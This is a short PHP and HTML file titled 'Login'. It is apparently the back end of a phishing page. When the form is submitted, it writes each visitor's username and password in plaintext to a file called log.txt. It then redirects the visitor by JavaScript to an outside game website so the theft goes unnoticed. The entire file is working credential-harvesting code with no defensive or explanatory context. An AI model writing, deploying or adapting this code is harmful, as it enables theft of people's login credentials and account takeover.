<html>
 <head>
  <title>Login</title>
 </head>
 <body>

<?php

//If Submit Button Is Clicked Do the Following
if ($_POST['Login']){

$myFile = "log.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_POST['username'] . ":";
fwrite($fh, $stringData);
$stringData = $_POST['password'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>


//goes here after
<script>location.href='https://www.turtlegames.org';</script>
	 
 </body>
</html>